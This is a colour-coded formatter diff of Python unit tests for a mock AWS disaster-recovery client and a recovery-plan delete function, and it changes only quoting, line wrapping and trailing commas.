\"LATEST\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n             ],\n\u001b[31m-            isDrill=False\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            isDrill=False,\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         assert \"job\" in response\n         job = response[\"job\"]\n         assert job[\"jobID\"].startswith(\"job-\")\n         assert job[\"status\"] == \"PENDING\"\n         assert job[\"type\"] == \"LAUNCH\"\n         assert len(job[\"participatingServers\"]) == 1\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_start_recovery_multiple_servers(self):\n         \"\"\"Test start_recovery with multiple servers.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[31m-        server_ids = [\"s-3d75cdc0d9a28a725\", \"s-3afa164776f93ce4f\", \"s-3c1730a9e0771ea14\"]\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        server_ids = [\u001b[0m\n\u001b[32m+            \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+            \"s-3afa164776f93ce4f\",\u001b[0m\n\u001b[32m+            \"s-3c1730a9e0771ea14\",\u001b[0m\n\u001b[32m+        ]\u001b[0m\n         response = client.start_recovery(\n             sourceServers=[\n                 {\"sourceServerID\": sid, \"recoverySnapshotID\": \"LATEST\"}\n                 for sid in server_ids\n             ],\n\u001b[31m-            isDrill=True\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            isDrill=True,\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         job = response[\"job\"]\n         assert job[\"type\"] == \"DRILL\"\n         assert len(job[\"participatingServers\"]) == 3\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_start_recovery_invalid_server(self):\n         \"\"\"Test start_recovery with invalid server ID.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[31m-        with pytest.raises(ResourceNotFoundException, match=\"Source server not found\"):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        with pytest.raises(\u001b[0m\n\u001b[32m+            ResourceNotFoundException, match=\"Source server not found\"\u001b[0m\n\u001b[32m+        ):\u001b[0m\n             client.start_recovery(\n                 sourceServers=[\n\u001b[31m-                    {\"sourceServerID\": \"s-invalid\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[32m+                    {\u001b[0m\n\u001b[32m+                        \"sourceServerID\": \"s-invalid\",\u001b[0m\n\u001b[32m+                        \"recoverySnapshotID\": \"LATEST\",\u001b[0m\n\u001b[32m+                    }\u001b[0m\n                 ]\n             )\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_describe_jobs_single(self):\n         \"\"\"Test describe_jobs returns created job.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Create a job\n         response = client.start_recovery(\n             sourceServers=[\n\u001b[31m-                {\"sourceServerID\": \"s-3d75cdc0d9a28a725\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                    \"recoverySnapshotID\": \"LATEST\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n             ]\n         )\n         job_id = response[\"job\"][\"jobID\"]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Describe the job\n\u001b[31m-        jobs_response = client.describe_jobs(\u001b[0m\n\u001b[31m-            filters={\"jobIDs\": [job_id]}\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        jobs_response = client.describe_jobs(filters={\"jobIDs\": [job_id]})\u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(jobs_response[\"items\"]) == 1\n         assert jobs_response[\"items\"][0][\"jobID\"] == job_id\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_describe_jobs_all(self):\n         \"\"\"Test describe_jobs returns all jobs.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Create multiple jobs\n         for i in range(3):\n             client.start_recovery(\n                 sourceServers=[\n\u001b[31m-                    {\"sourceServerID\": \"s-3d75cdc0d9a28a725\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[32m+                    {\u001b[0m\n\u001b[32m+                        \"sourceServerID\": \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                        \"recoverySnapshotID\": \"LATEST\",\u001b[0m\n\u001b[32m+                    }\u001b[0m\n                 ]\n             )\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Describe all jobs\n         response = client.describe_jobs()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(response[\"items\"]) == 3\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_job_status_transitions(self):\n         \"\"\"Test job status transitions from PENDING to IN_PROGRESS to COMPLETED.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Create a job\n         response = client.start_recovery(\n             sourceServers=[\n\u001b[31m-                {\"sourceServerID\": \"s-3d75cdc0d9a28a725\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                    \"recoverySnapshotID\": \"LATEST\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n             ]\n         )\n         job_id = response[\"job\"][\"jobID\"]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Initially PENDING\n         jobs = client.describe_jobs(filters={\"jobIDs\": [job_id]})\n         assert jobs[\"items\"][0][\"status\"] == \"PENDING\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Wait for IN_PROGRESS transition (5 seconds in mock)\n         time.sleep(6)\n         jobs = client.describe_jobs(filters={\"jobIDs\": [job_id]})\n         assert jobs[\"items\"][0][\"status\"] == \"IN_PROGRESS\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify recovery instance ID is generated\n\u001b[31m-        assert jobs[\"items\"][0][\"participatingServers\"][0][\"recoveryInstanceID\"] is not None\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            jobs[\"items\"][0][\"participatingServers\"][0][\"recoveryInstanceID\"]\u001b[0m\n\u001b[32m+            is not None\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Wait for COMPLETED transition (30 seconds total in mock)\n         time.sleep(25)\n         jobs = client.describe_jobs(filters={\"jobIDs\": [job_id]})\n         assert jobs[\"items\"][0][\"status\"] == \"COMPLETED\"\n         assert jobs[\"items\"][0][\"endDateTime\"] is not None\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_throttling_simulation(self):\n         \"\"\"Test throttling simulation after N calls.\"\"\"\n         client = MockDRSClient(\n\u001b[31m-            simulate_throttling=True,\u001b[0m\n\u001b[31m-            throttle_after_calls=3\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            simulate_throttling=True, throttle_after_calls=3\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # First 3 calls should succeed\n         for i in range(3):\n             client.describe_source_servers()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # 4th call should throttle\n         with pytest.raises(ThrottlingException, match=\"Rate exceeded\"):\n             client.describe_source_servers()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # After throttle, next call should succeed (counter reset)\n         client.describe_source_servers()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_error_simulation(self):\n         \"\"\"Test random error simulation.\"\"\"\n         client = MockDRSClient(\n\u001b[31m-            simulate_errors=True,\u001b[0m\n\u001b[31m-            error_rate=1.0  # 100% error rate for testing\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        with pytest.raises(ServiceUnavailableException, match=\"Service temporarily unavailable\"):\u001b[0m\n\u001b[32m+            simulate_errors=True, error_rate=1.0  # 100% error rate for testing\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        with pytest.raises(\u001b[0m\n\u001b[32m+            ServiceUnavailableException,\u001b[0m\n\u001b[32m+            match=\"Service temporarily unavailable\",\u001b[0m\n\u001b[32m+        ):\u001b[0m\n             client.describe_source_servers()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_terminate_recovery_instances(self):\n         \"\"\"Test terminate_recovery_instances.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Start recovery to get instance IDs\n         response = client.start_recovery(\n             sourceServers=[\n\u001b[31m-                {\"sourceServerID\": \"s-3d75cdc0d9a28a725\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                    \"recoverySnapshotID\": \"LATEST\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Wait for instance to be created\n         time.sleep(6)\n\u001b[31m-        jobs = client.describe_jobs(filters={\"jobIDs\": [response[\"job\"][\"jobID\"]]})\u001b[0m\n\u001b[31m-        instance_id = jobs[\"items\"][0][\"participatingServers\"][0][\"recoveryInstanceID\"]\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        jobs = client.describe_jobs(\u001b[0m\n\u001b[32m+            filters={\"jobIDs\": [response[\"job\"][\"jobID\"]]}\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        instance_id = jobs[\"items\"][0][\"participatingServers\"][0][\u001b[0m\n\u001b[32m+            \"recoveryInstanceID\"\u001b[0m\n\u001b[32m+        ]\u001b[0m\n\u001b[32m+\u001b[0m\n         # Terminate instance\n         term_response = client.terminate_recovery_instances(\n             recoveryInstanceIDs=[instance_id]\n         )\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert term_response[\"job\"][\"type\"] == \"TERMINATE_RECOVERY_INSTANCES\"\n         assert term_response[\"job\"][\"status\"] == \"COMPLETED\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_add_source_server(self):\n         \"\"\"Test adding custom source server.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         custom_server_id = \"s-custom123456789ab\"\n         client.add_source_server(custom_server_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = client.describe_source_servers(\n             filters={\"sourceServerIDs\": [custom_server_id]}\n         )\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(response[\"items\"]) == 1\n         assert response[\"items\"][0][\"sourceServerID\"] == custom_server_id\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_remove_source_server(self):\n         \"\"\"Test removing source server.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         server_id = \"s-3d75cdc0d9a28a725\"\n         client.remove_source_server(server_id)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = client.describe_source_servers(\n             filters={\"sourceServerIDs\": [server_id]}\n         )\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(response[\"items\"]) == 0\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_simulate_job_failure(self):\n         \"\"\"Test simulating job failure.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Create a job\n         response = client.start_recovery(\n             sourceServers=[\n\u001b[31m-                {\"sourceServerID\": \"s-3d75cdc0d9a28a725\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                    \"recoverySnapshotID\": \"LATEST\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n             ]\n         )\n         job_id = response[\"job\"][\"jobID\"]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Simulate failure\n         error_msg = \"Test failure message\"\n         client.simulate_job_failure(job_id, error_msg)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify job is failed\n         jobs = client.describe_jobs(filters={\"jobIDs\": [job_id]})\n         job = jobs[\"items\"][0]\n         assert job[\"status\"] == \"FAILED\"\n         assert job[\"statusMessage\"] == error_msg\n         assert job[\"participatingServers\"][0][\"launchStatus\"] == \"FAILED\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_reset(self):\n         \"\"\"Test resetting mock state.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Create some jobs\n         client.start_recovery(\n             sourceServers=[\n\u001b[31m-                {\"sourceServerID\": \"s-3d75cdc0d9a28a725\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                    \"recoverySnapshotID\": \"LATEST\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Add custom server\n         client.add_source_server(\"s-custom\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Reset\n         client.reset()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify state is reset\n         jobs = client.describe_jobs()\n         assert len(jobs[\"items\"]) == 0\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         servers = client.describe_source_servers()\n         assert len(servers[\"items\"]) == 6  # Back to default 6\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Custom server should be gone\n\u001b[31m-        custom = client.describe_source_servers(filters={\"sourceServerIDs\": [\"s-custom\"]})\u001b[0m\n\u001b[32m+        custom = client.describe_source_servers(\u001b[0m\n\u001b[32m+            filters={\"sourceServerIDs\": [\"s-custom\"]}\u001b[0m\n\u001b[32m+        )\u001b[0m\n         assert len(custom[\"items\"]) == 0\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_factory_function(self):\n         \"\"\"Test create_mock_drs_client factory function.\"\"\"\n         client = create_mock_drs_client(simulate_throttling=True)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert isinstance(client, MockDRSClient)\n         assert client.simulate_throttling is True\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_job_has_required_fields(self):\n         \"\"\"Test that created jobs have all required fields.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[31m-        response = client.start_recovery(\u001b[0m\n\u001b[31m-            sourceServers=[\u001b[0m\n\u001b[31m-                {\"sourceServerID\": \"s-3d75cdc0d9a28a725\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        response = client.start_recovery(\u001b[0m\n\u001b[32m+            sourceServers=[\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                    \"recoverySnapshotID\": \"LATEST\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n             ],\n\u001b[31m-            isDrill=True\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            isDrill=True,\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         job = response[\"job\"]\n         required_fields = [\n\u001b[31m-            \"jobID\", \"arn\", \"type\", \"initiatedBy\", \"creationDateTime\",\u001b[0m\n\u001b[31m-            \"status\", \"participatingServers\"\u001b[0m\n\u001b[32m+            \"jobID\",\u001b[0m\n\u001b[32m+            \"arn\",\u001b[0m\n\u001b[32m+            \"type\",\u001b[0m\n\u001b[32m+            \"initiatedBy\",\u001b[0m\n\u001b[32m+            \"creationDateTime\",\u001b[0m\n\u001b[32m+            \"status\",\u001b[0m\n\u001b[32m+            \"participatingServers\",\u001b[0m\n         ]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for field in required_fields:\n             assert field in job, f\"Job missing required field: {field}\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_server_has_required_fields(self):\n         \"\"\"Test that source servers have all required fields.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = client.describe_source_servers()\n         server = response[\"items\"][0]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         required_fields = [\n\u001b[31m-            \"sourceServerID\", \"arn\", \"dataReplicationInfo\",\u001b[0m\n\u001b[31m-            \"lastLaunchResult\", \"lifeCycle\", \"sourceProperties\"\u001b[0m\n\u001b[32m+            \"sourceServerID\",\u001b[0m\n\u001b[32m+            \"arn\",\u001b[0m\n\u001b[32m+            \"dataReplicationInfo\",\u001b[0m\n\u001b[32m+            \"lastLaunchResult\",\u001b[0m\n\u001b[32m+            \"lifeCycle\",\u001b[0m\n\u001b[32m+            \"sourceProperties\",\u001b[0m\n         ]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for field in required_fields:\n             assert field in server, f\"Server missing required field: {field}\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_participating_server_fields(self):\n         \"\"\"Test participating server structure in jobs.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[31m-        response = client.start_recovery(\u001b[0m\n\u001b[31m-            sourceServers=[\u001b[0m\n\u001b[31m-                {\"sourceServerID\": \"s-3d75cdc0d9a28a725\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        response = client.start_recovery(\u001b[0m\n\u001b[32m+            sourceServers=[\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                    \"recoverySnapshotID\": \"LATEST\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         participating_server = response[\"job\"][\"participatingServers\"][0]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert \"sourceServerID\" in participating_server\n         assert \"recoveryInstanceID\" in participating_server\n         assert \"launchStatus\" in participating_server\n         assert participating_server[\"launchStatus\"] == \"PENDING\"\n\u001b[1m--- tests/python/unit/test_recovery_plan_delete.py\t2025-11-20 01:34:19.092799+00:00\u001b[0m\n\u001b[1m+++ tests/python/unit/test_recovery_plan_delete.py\t2026-01-02 15:49:03.665627+00:00\u001b[0m\n\u001b[36m@@ -14,254 +14,293 @@\u001b[0m\n os.environ[\"AWS_ACCESS_KEY_ID\"] = \"testing\"\n os.environ[\"AWS_SECRET_ACCESS_KEY\"] = \"testing\"\n os.environ[\"PROTECTION_GROUPS_TABLE\"] = \"protection-groups-test\"\n os.environ[\"RECOVERY_PLANS_TABLE\"] = \"recovery-plans-test\"\n os.environ[\"EXECUTION_HISTORY_TABLE\"] = \"execution-history-test\"\n\u001b[31m-os.environ[\"STATE_MACHINE_ARN\"] = \"arn:aws:states:us-east-1:123456789012:stateMachine:test\"\u001b[0m\n\u001b[32m+os.environ[\u001b[0m\n\u001b[32m+    \"STATE_MACHINE_ARN\"\u001b[0m\n\u001b[32m+] = \"arn:aws:states:us-east-1:123456789012:stateMachine:test\"\u001b[0m\n \n # Add lambda directory to path\n\u001b[31m-sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..', 'lambda'))\u001b[0m\n\u001b[32m+sys.path.insert(\u001b[0m\n\u001b[32m+    0, os.path.join(os.path.dirname(__file__), \"..\", \"..\", \"..\", \"lambda\")\u001b[0m\n\u001b[32m+)\u001b[0m\n \n from index import delete_recovery_plan\n \n \n class TestRecoveryPlanDelete:\n     \"\"\"Test delete_recovery_plan function with GSI query and fallback logic\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_delete_with_no_executions_gsi_success(self, mock_plans_table, mock_history_table):\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_delete_with_no_executions_gsi_success(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test successful delete when no active executions exist (GSI query works)\"\"\"\n\u001b[31m-        plan_id = 'plan-123'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-123\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Mock GSI query returning no active executions\n\u001b[31m-        mock_history_table.query.return_value = {'Items': []}\u001b[0m\n\u001b[31m-        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        mock_history_table.query.return_value = {\"Items\": []}\u001b[0m\n\u001b[32m+        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify GSI query was attempted\n         mock_history_table.query.assert_called_once()\n         call_kwargs = mock_history_table.query.call_args[1]\n\u001b[31m-        assert call_kwargs['IndexName'] == 'PlanIdIndex'\u001b[0m\n\u001b[31m-        assert call_kwargs['Limit'] == 1\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        assert call_kwargs[\"IndexName\"] == \"PlanIdIndex\"\u001b[0m\n\u001b[32m+        assert call_kwargs[\"Limit\"] == 1\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify delete was called\n\u001b[31m-        mock_plans_table.delete_item.assert_called_once_with(Key={'PlanId': plan_id})\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        mock_plans_table.delete_item.assert_called_once_with(\u001b[0m\n\u001b[32m+            Key={\"PlanId\": plan_id}\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify success response\n\u001b[31m-        assert result['statusCode'] == 200\u001b[0m\n\u001b[31m-        body = eval(result['body'])\u001b[0m\n\u001b[31m-        assert body['message'] == 'Recovery Plan deleted successfully'\u001b[0m\n\u001b[31m-        assert body['planId'] == plan_id\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_delete_with_no_executions_scan_fallback(self, mock_plans_table, mock_history_table):\u001b[0m\n\u001b[32m+        assert result[\"statusCode\"] == 200\u001b[0m\n\u001b[32m+        body = eval(result[\"body\"])\u001b[0m\n\u001b[32m+        assert body[\"message\"] == \"Recovery Plan deleted successfully\"\u001b[0m\n\u001b[32m+        assert body[\"planId\"] == plan_id\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_delete_with_no_executions_scan_fallback(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test successful delete using scan fallback when GSI doesn't exist\"\"\"\n\u001b[31m-        plan_id = 'plan-456'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-456\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Mock GSI query failure, then scan success\n         mock_history_table.query.side_effect = ClientError(\n\u001b[31m-            {'Error': {'Code': 'ValidationException', 'Message': 'Index not found'}},\u001b[0m\n\u001b[31m-            'Query'\u001b[0m\n\u001b[31m-        )\u001b[0m\n\u001b[31m-        mock_history_table.scan.return_value = {'Items': []}\u001b[0m\n\u001b[31m-        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            {\u001b[0m\n\u001b[32m+                \"Error\": {\u001b[0m\n\u001b[32m+                    \"Code\": \"ValidationException\",\u001b[0m\n\u001b[32m+                    \"Message\": \"Index not found\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+            \"Query\",\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        mock_history_table.scan.return_value = {\"Items\": []}\u001b[0m\n\u001b[32m+        mock_plans_table.delete_item.return_value = {}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify GSI query was attempted first\n         mock_history_table.query.assert_called_once()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify fallback scan was called\n         mock_history_table.scan.assert_called_once()\n         scan_kwargs = mock_history_table.scan.call_args[1]\n\u001b[31m-        assert scan_kwargs['Limit'] == 1\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        assert scan_kwargs[\"Limit\"] == 1\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify delete was called\n\u001b[31m-        mock_plans_table.delete_item.assert_called_once_with(Key={'PlanId': plan_id})\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        mock_plans_table.delete_item.assert_called_once_with(\u001b[0m\n\u001b[32m+            Key={\"PlanId\": plan_id}\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify success response\n\u001b[31m-        assert result['statusCode'] == 200\u001b[0m\n\u001b[31m-        body = eval(result['body'])\u001b[0m\n\u001b[31m-        assert body['message'] == 'Recovery Plan deleted successfully'\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.execution_history_table')\u001b[0m\n\u001b[31m-    @patch('index.recovery_plans_table')\u001b[0m\n\u001b[31m-    def test_delete_blocked_by_active_execution(self, mock_plans_table, mock_history_table):\u001b[0m\n\u001b[32m+        assert result[\"statusCode\"] == 200\u001b[0m\n\u001b[32m+        body = eval(result[\"body\"])\u001b[0m\n\u001b[32m+        assert body[\"message\"] == \"Recovery Plan deleted successfully\"\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.execution_history_table\")\u001b[0m\n\u001b[32m+    @patch(\"index.recovery_plans_table\")\u001b[0m\n\u001b[32m+    def test_delete_blocked_by_active_execution(\u001b[0m\n\u001b[32m+        self, mock_plans_table, mock_history_table\u001b[0m\n\u001b[32m+    ):\u001b[0m\n         \"\"\"Test delete fails with 409 when active RUNNING execution exists\"\"\"\n\u001b[31m-        plan_id = 'plan-789'\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        plan_id = \"plan-789\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Mock GSI query returning 1 active execution\n         mock_history_table.query.return_value = {\n\u001b[31m-            'Items': [{\u001b[0m\n\u001b[31m-                'ExecutionId': 'exec-123',\u001b[0m\n\u001b[31m-                'PlanId': plan_id,\u001b[0m\n\u001b[31m-                'Status': 'RUNNING'\u001b[0m\n\u001b[31m-            }]\u001b[0m\n\u001b[32m+            \"Items\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"ExecutionId\": \"exec-123\",\u001b[0m\n\u001b[32m+                    \"PlanId\": plan_id,\u001b[0m\n\u001b[32m+                    \"Status\": \"RUNNING\",\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            ]\u001b[0m\n         }\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = delete_recovery_plan(plan_id)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify delete was NOT called\n         